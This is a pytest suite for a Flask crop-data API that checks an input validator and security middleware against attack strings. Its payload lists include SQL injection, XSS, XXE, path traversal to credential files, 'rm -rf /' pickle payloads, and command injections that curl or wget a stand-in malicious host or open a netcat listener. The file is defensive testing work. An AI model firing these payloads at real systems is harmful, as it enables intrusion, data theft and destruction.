"""
Comprehensive security validation tests covering all security aspects.
"""

import pytest
import json
import time
from unittest.mock import patch, MagicMock, call
from flask import Flask, request, g
from werkzeug.test import Client

from backend.services.security_validator import SecurityValidator, InputSanitizer
from backend.services.security_middleware import create_security_middleware
from backend.services.exceptions import (
    SecurityValidationException, ValidationException, 
    InvalidAPIKeyException, RateLimitExceededException
)


class TestComprehensiveInputValidation:
    """Comprehensive tests for input validation and sanitization."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = SecurityValidator()
    
    def test_sql_injection_prevention_comprehensive(self):
        """Test comprehensive SQL injection prevention."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/1=1",
            "UNION SELECT * FROM users",
            "1; DELETE FROM predictions",
            "' OR 1=1#",
            "' UNION SELECT password FROM users WHERE username='admin'--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': payload,
                'user_type': 'farmer'
            }
            
            with pytest.raises(SecurityValidationException) as exc_info:
                self.validator.validate_and_sanitize_request(request_data)
            
            assert exc_info.value.details['security_issue'] == 'sql_injection'
    
    def test_xss_prevention_comprehensive(self):
        """Test comprehensive XSS prevention."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio src=x onerror=alert('xss')>",
            "<details open ontoggle=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': 'Test Location',
                'user_context': payload,
                'user_type': 'farmer'
            }
            
            with pytest.raises(SecurityValidationException) as exc_info:
                self.validator.validate_and_sanitize_request(request_data)
            
            assert exc_info.value.details['security_issue'] in ['xss_attack', 'sql_injection']
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': payload,
                'user_type': 'farmer'
            }
            
            # Should either raise exception or sanitize the input
            try:
                result = self.validator.validate_and_sanitize_request(request_data)
                # If no exception, verify the payload was sanitized
                assert '../' not in result.location
                assert '..\\' not in result.location
            except SecurityValidationException:
                # Exception is also acceptable for malicious input
                pass
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; ping -c 4 127.0.0.1",
            "| nc -l 4444",
            "&& curl http://malicious.com/steal?data=",
            "; wget http://malicious.com/backdoor.sh"
        ]
        
        for payload in command_injection_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': f"Kenya {payload}",
                'user_type': 'farmer'
            }
            
            # Should sanitize or reject command injection attempts
            try:
                result = self.validator.validate_and_sanitize_request(request_data)
                # Verify dangerous characters are removed
                assert ';' not in result.location
                assert '|' not in result.location
                assert '`' not in result.location
                assert '$(' not in result.location
            except SecurityValidationException:
                # Exception is acceptable for malicious input
                pass
    
    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection attacks."""
        ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(uid=*))",
            "admin)(&(password=*))",
            "*))%00",
            ")(cn=*",
            "*)(objectClass=*"
        ]
        
        for payload in ldap_injection_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': f"Location {payload}",
                'user_type': 'farmer'
            }
            
            # Should sanitize LDAP injection attempts
            result = self.validator.validate_and_sanitize_request(request_data)
            # Verify LDAP special characters are handled
            assert ')(' not in result.location or len(result.location) < len(payload)
    
    def test_xml_injection_prevention(self):
        """Test prevention of XML injection attacks."""
        xml_injection_payloads = [
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://malicious.com/evil.dtd'> %xxe;]>",
            "<![CDATA[<script>alert('xss')</script>]]>"
        ]
        
        for payload in xml_injection_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': payload,
                'user_type': 'farmer'
            }
            
            # Should sanitize or reject XML injection attempts
            try:
                result = self.validator.validate_and_sanitize_request(request_data)
                # Verify XML entities are removed
                assert '<!DOCTYPE' not in result.location
                assert '<!ENTITY' not in result.location
                assert '<![CDATA[' not in result.location
            except SecurityValidationException:
                # Exception is acceptable for malicious input
                pass


class TestAdvancedSecurityValidation:
    """Advanced security validation tests."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = SecurityValidator()
    
    def test_unicode_normalization_attacks(self):
        """Test prevention of Unicode normalization attacks."""
        unicode_payloads = [
            "admin\u0000",  # Null byte
            "admin\u202e",  # Right-to-left override
            "admin\ufeff",  # Zero width no-break space
            "admin\u200b",  # Zero width space
            "admin\u2028",  # Line separator
            "admin\u2029",  # Paragraph separator
        ]
        
        for payload in unicode_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': payload,
                'user_type': 'farmer'
            }
            
            result = self.validator.validate_and_sanitize_request(request_data)
            # Verify dangerous Unicode characters are handled
            assert '\u0000' not in result.location
            assert len(result.location.strip()) > 0
    
    def test_buffer_overflow_attempts(self):
        """Test handling of potential buffer overflow attempts."""
        # Very long strings that might cause buffer overflows
        long_payloads = [
            'A' * 10000,
            'B' * 50000,
            'C' * 100000
        ]
        
        for payload in long_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': payload,
                'user_type': 'farmer'
            }
            
            # Should handle long strings gracefully
            result = self.validator.validate_and_sanitize_request(request_data)
            # Verify string is truncated to reasonable length
            assert len(result.location) <= 200
    
    def test_format_string_attacks(self):
        """Test prevention of format string attacks."""
        format_string_payloads = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%.1000d%.1000d%.1000d",
            "%08x.%08x.%08x.%08x"
        ]
        
        for payload in format_string_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': f"Location {payload}",
                'user_type': 'farmer'
            }
            
            result = self.validator.validate_and_sanitize_request(request_data)
            # Verify format string specifiers are handled
            assert '%n' not in result.location
    
    def test_regex_dos_prevention(self):
        """Test prevention of Regular Expression Denial of Service (ReDoS)."""
        redos_payloads = [
            "a" * 10000 + "!",  # Potential catastrophic backtracking
            "(" * 1000 + "a" + ")" * 1000,  # Nested groups
            "a" * 5000 + "b" * 5000,  # Long alternation
        ]
        
        for payload in redos_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': payload,
                'user_type': 'farmer'
            }
            
            start_time = time.time()
            result = self.validator.validate_and_sanitize_request(request_data)
            end_time = time.time()
            
            # Validation should complete quickly even with malicious input
            assert end_time - start_time < 1.0  # Should complete in less than 1 second
    
    def test_deserialization_attacks(self):
        """Test prevention of deserialization attacks."""
        # Simulate serialized objects that could be dangerous
        serialization_payloads = [
            "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdAAEY2FsYw==",
            "__import__('os').system('rm -rf /')",
            "pickle.loads(b'cos\\nsystem\\n(S\\'rm -rf /\\'\\ntR.')"
        ]
        
        for payload in serialization_payloads:
            request_data = {
                'ndvi_mean_early': 0.5,
                'ndvi_median_early': 0.5,
                'ndvi_std_early': 0.1,
                'ndvi_mean_late': 0.3,
                'ndvi_median_late': 0.3,
                'ndvi_std_late': 0.1,
                'ndvi_delta_mean': -0.2,
                'location': payload,
                'user_type': 'farmer'
            }
            
            # Should sanitize potential serialization attacks
            result = self.validator.validate_and_sanitize_request(request_data)
            assert '__import__' not in result.location
            assert 'pickle.loads' not in result.location


class TestSecurityMiddlewareComprehensive:
    """Comprehensive tests for security middleware."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.app = Flask(__name__)
        self.app.config['TESTING'] = True
        
        # Initialize security middleware
        security_config = {
            'max_content_length': 1024 * 1024,
            'max_request_time_seconds': 5,
            'cors': {
                'origins': ['http://localhost:3000'],
                'methods': ['GET', 'POST', 'OPTIONS'],
                'headers': ['Content-Type', 'X-API-Key']
            }
        }
        
        self.security_middleware = create_security_middleware(security_config)
        self.security_middleware.init_app(self.app)
        
        @self.app.route('/test', methods=['POST'])
        def test_route():
            return {'message': 'success'}
        
        self.client = self.app.test_client()
    
    def test_comprehensive_security_headers(self):
        """Test that all required security headers are present."""
        response = self.client.post('/test',
                                  headers={'Content-Type': 'application/json'},
                                  json={'test': 'data'})
        
        required_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Referrer-Policy',
            'Content-Security-Policy',
            'Strict-Transport-Security',
            'Cache-Control',
            'Pragma',
            'Expires'
        ]
        
        for header in required_headers:
            assert header in response.headers, f"Missing security header: {header}"
    
    def test_csp_header_configuration(self):
        """Test Content Security Policy header configuration."""
        response = self.client.post('/test',
                                  headers={'Content-Type': 'application/json'},
                                  json={'test': 'data'})
        
        csp_header = response.headers.get('Content-Security-Policy')
        assert csp_header is not None
        assert "default-src 'self'" in csp_header
        assert "script-src 'none'" in csp_header
        assert "object-src 'none'" in csp_header
    
    def test_hsts_header_configuration(self):
        """Test HTTP Strict Transport Security header."""
        response = self.client.post('/test',
                                  headers={'Content-Type': 'application/json'},
                                  json={'test': 'data'})
        
        hsts_header = response.headers.get('Strict-Transport-Security')
        assert hsts_header is not None
        assert 'max-age=31536000' in hsts_header
        assert 'includeSubDomains' in hsts_header
    
    def test_cache_control_headers(self):
        """Test cache control headers for security."""
        response = self.client.post('/test',
                                  headers={'Content-Type': 'application/json'},
                                  json={'test': 'data'})
        
        assert response.headers.get('Cache-Control') == 'no-cache, no-store, must-revalidate'
        assert response.headers.get('Pragma') == 'no-cache'
        assert response.headers.get('Expires') == '0'
    
    def test_advanced_cors_scenarios(self):
        """Test advanced CORS scenarios."""
        # Test preflight request
        response = self.client.options('/test',
                                     headers={
                                         'Origin': 'http://localhost:3000',
                                         'Access-Control-Request-Method': 'POST',
                                         'Access-Control-Request-Headers': 'Content-Type'
                                     })
        
        assert response.status_code == 200
        assert 'Access-Control-Allow-Origin' in response.headers
        assert 'Access-Control-Allow-Methods' in response.headers
        assert 'Access-Control-Allow-Headers' in response.headers
        assert 'Access-Control-Max-Age' in response.headers
    
    def test_malicious_header_detection(self):
        """Test detection of malicious headers."""
        malicious_headers = {
            'X-Forwarded-For': '127.0.0.1, 192.168.1.1' + ', 10.0.0.1' * 100,  # Header injection
            'X-Real-IP': '<script>alert("xss")</script>',
            'User-Agent': 'Mozilla/5.0' + 'A' * 10000,  # Oversized header
            'Referer': 'javascript:alert("xss")',
            'X-Custom': '\r\nSet-Cookie: malicious=true'  # CRLF injection
        }
        
        for header_name, header_value in malicious_headers.items():
            response = self.client.post('/test',
                                      headers={
                                          'Content-Type': 'application/json',
                                          header_name: header_value
                                      },
                                      json={'test': 'data'})
            
            # Should either block the request or sanitize the headers
            if response.status_code == 400:
                # Request was blocked due to malicious headers
                data = response.get_json()
                assert data['error'] == 'SECURITY_VALIDATION_ERROR'
            else:
                # Request was allowed, verify headers are sanitized
                assert response.status_code == 200


class TestRateLimitingComprehensive:
    """Comprehensive tests for rate limiting functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.app = Flask(__name__)
        self.app.config['TESTING'] = True
        
        # Mock Redis for testing
        self.mock_redis = MagicMock()
        
        @self.app.route('/rate_limited', methods=['POST'])
        def rate_limited_route():
            return {'message': 'success'}
        
        self.client = self.app.test_client()
    
    @patch('app.cache_service')
    def test_distributed_rate_limiting(self, mock_cache):
        """Test distributed rate limiting across multiple instances."""
        mock_cache.get_redis_client.return_value = self.mock_redis
        
        # Simulate requests from multiple instances
        self.mock_redis.get.return_value = b'5'
        self.mock_redis.incr.return_value = 6
        self.mock_redis.expire.return_value = True
        
        response = self.client.post('/rate_limited',
                                  headers={'X-API-Key': 'test_key'},
                                  json={'test': 'data'})
        
        # Verify Redis operations for distributed rate limiting
        self.mock_redis.get.assert_called()
        self.mock_redis.incr.assert_called()
        self.mock_redis.expire.assert_called()
    
    @patch('app.cache_service')
    def test_sliding_window_rate_limiting(self, mock_cache):
        """Test sliding window rate limiting algorithm."""
        mock_cache.get_redis_client.return_value = self.mock_redis
        
        # Mock sliding window implementation
        current_time = int(time.time())
        window_keys = [f"rate_limit:test_key:{current_time - i}" for i in range(5)]
        
        # Simulate requests across time windows
        for i, key in enumerate(window_keys):
            self.mock_redis.get.return_value = str(i + 1).encode()
            response = self.client.post('/rate_limited',
                                      headers={'X-API-Key': 'test_key'},
                                      json={'test': f'data_{i}'})
    
    @patch('app.cache_service')
    def test_rate_limiting_bypass_attacks(self, mock_cache):
        """Test prevention of rate limiting bypass attacks."""
        mock_cache.get_redis_client.return_value = self.mock_redis
        
        # Test various bypass techniques
        bypass_techniques = [
            {'X-API-Key': 'test_key', 'X-Forwarded-For': '192.168.1.1'},
            {'X-API-Key': 'test_key', 'X-Real-IP': '10.0.0.1'},
            {'X-API-Key': 'test_key', 'X-Originating-IP': '172.16.0.1'},
            {'X-API-Key': 'TEST_KEY'},  # Case variation
            {'X-API-Key': 'test_key '},  # Trailing space
            {'X-API-Key': ' test_key'},  # Leading space
        ]
        
        self.mock_redis.get.return_value = b'10'  # At rate limit
        self.mock_redis.incr.return_value = 11
        
        for headers in bypass_techniques:
            headers['Content-Type'] = 'application/json'
            response = self.client.post('/rate_limited',
                                      headers=headers,
                                      json={'test': 'data'})
            
            # All should be rate limited (no bypass allowed)
            assert response.status_code == 429
    
    def test_rate_limiting_error_handling(self):
        """Test error handling in rate limiting."""
        with patch('app.cache_service') as mock_cache:
            # Simulate Redis connection failure
            mock_cache.get_redis_client.side_effect = Exception("Redis unavailable")
            
            response = self.client.post('/rate_limited',
                                      headers={'X-API-Key': 'test_key'},
                                      json={'test': 'data'})
            
            # Should gracefully handle Redis failure
            assert response.status_code == 200  # Continue without rate limiting


class TestSecurityIntegrationComprehensive:
    """Comprehensive integration tests for all security components."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.app = Flask(__name__)
        self.app.config['TESTING'] = True
        
        # Initialize all security components
        from app import require_api_key, rate_limit
        from services.security_middleware import create_security_middleware
        
        security_middleware = create_security_middleware()
        security_middleware.init_app(self.app)
        
        @self.app.route('/comprehensive_test', methods=['POST'])
        @rate_limit
        @require_api_key
        def comprehensive_test():
            # Validate input using security validator
            validator = SecurityValidator()
            data = request.get_json()
            validated_data = validator.validate_and_sanitize_request(data)
            
            return {'message': 'comprehensive_success', 'validated': True}
        
        self.client = self.app.test_client()
    
    def test_full_security_pipeline_success(self):
        """Test successful request through full security pipeline."""
        response = self.client.post('/comprehensive_test',
                                  headers={
                                      'X-API-Key': 'valid_test_key',
                                      'Content-Type': 'application/json',
                                      'Origin': 'http://localhost:3000'
                                  },
                                  json={
                                      'ndvi_mean_early': 0.5,
                                      'ndvi_median_early': 0.48,
                                      'ndvi_std_early': 0.1,
                                      'ndvi_mean_late': 0.3,
                                      'ndvi_median_late': 0.28,
                                      'ndvi_std_late': 0.12,
                                      'ndvi_delta_mean': -0.2,
                                      'location': 'Baringo County, Kenya',
                                      'user_type': 'farmer'
                                  })
        
        assert response.status_code == 200
        data = response.get_json()
        assert data['message'] == 'comprehensive_success'
        assert data['validated'] is True
        
        # Verify security headers
        assert 'X-Content-Type-Options' in response.headers
        assert 'Access-Control-Allow-Origin' in response.headers
    
    def test_security_pipeline_with_malicious_input(self):
        """Test security pipeline with malicious input."""
        malicious_requests = [
            # SQL injection attempt
            {
                'ndvi_mean_early': 0.5,
                'location': "'; DROP TABLE users; --",
                'user_type': 'farmer'
            },
            # XSS attempt
            {
                'ndvi_mean_early': 0.5,
                'location': 'Kenya',
                'user_context': "<script>alert('xss')</script>",
                'user_type': 'farmer'
            },
            # Oversized request
            {
                'ndvi_mean_early': 0.5,
                'location': 'A' * 10000,
                'user_type': 'farmer'
            }
        ]
        
        for malicious_data in malicious_requests:
            response = self.client.post('/comprehensive_test',
                                      headers={
                                          'X-API-Key': 'valid_test_key',
                                          'Content-Type': 'application/json'
                                      },
                                      json=malicious_data)
            
            # Should be blocked by security validation
            assert response.status_code in [400, 422]
    
    def test_security_pipeline_performance(self):
        """Test performance of security pipeline."""
        start_time = time.time()
        
        # Send multiple requests to test performance
        for i in range(10):
            response = self.client.post('/comprehensive_test',
                                      headers={
                                          'X-API-Key': f'test_key_{i}',
                                          'Content-Type': 'application/json'
                                      },
                                      json={
                                          'ndvi_mean_early': 0.5,
                                          'ndvi_median_early': 0.48,
                                          'ndvi_std_early': 0.1,
                                          'ndvi_mean_late': 0.3,
                                          'ndvi_median_late': 0.28,
                                          'ndvi_std_late': 0.12,
                                          'ndvi_delta_mean': -0.2,
                                          'location': f'Location {i}',
                                          'user_type': 'farmer'
                                      })
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Security pipeline should be performant
        assert total_time < 5.0  # Should complete 10 requests in less than 5 seconds
        avg_time_per_request = total_time / 10
        assert avg_time_per_request < 0.5  # Each request should take less than 500ms
    
    def test_concurrent_security_validation(self):
        """Test security validation under concurrent load."""
        import threading
        import queue
        
        results = queue.Queue()
        
        def make_request(request_id):
            try:
                response = self.client.post('/comprehensive_test',
                                          headers={
                                              'X-API-Key': f'concurrent_key_{request_id}',
                                              'Content-Type': 'application/json'
                                          },
                                          json={
                                              'ndvi_mean_early': 0.5,
                                              'location': f'Concurrent Location {request_id}',
                                              'user_type': 'farmer'
                                          })
                results.put((request_id, response.status_code))
            except Exception as e:
                results.put((request_id, f"Error: {e}"))
        
        # Create multiple threads for concurrent requests
        threads = []
        for i in range(5):
            thread = threading.Thread(target=make_request, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Verify all requests were handled correctly
        while not results.empty():
            request_id, status = results.get()
            assert isinstance(status, int), f"Request {request_id} failed: {status}"
            assert status in [200, 400, 401, 429], f"Unexpected status for request {request_id}: {status}"
    
    def test_security_logging_comprehensive(self):
        """Test comprehensive security logging."""
        with patch('app.logging_service') as mock_logging:
            # Make various types of requests
            requests = [
                # Valid request
                {
                    'headers': {'X-API-Key': 'valid_key', 'Content-Type': 'application/json'},
                    'json': {'ndvi_mean_early': 0.5, 'location': 'Kenya', 'user_type': 'farmer'}
                },
                # Invalid API key
                {
                    'headers': {'Content-Type': 'application/json'},
                    'json': {'ndvi_mean_early': 0.5, 'location': 'Kenya', 'user_type': 'farmer'}
                },
                # Malicious input
                {
                    'headers': {'X-API-Key': 'valid_key', 'Content-Type': 'application/json'},
                    'json': {'ndvi_mean_early': 0.5, 'location': "'; DROP TABLE users; --", 'user_type': 'farmer'}
                }
            ]
            
            for req in requests:
                response = self.client.post('/comprehensive_test', **req)
            
            # Verify comprehensive logging occurred
            assert mock_logging.log_security_event.call_count >= 2
            assert mock_logging.log_api_request.call_count >= 1
            
            # Verify different types of security events were logged
            calls = mock_logging.log_security_event.call_args_list
            event_types = [str(call) for call in calls]
            
            # Should have authentication and validation events
            assert any('api_key' in event for event in event_types)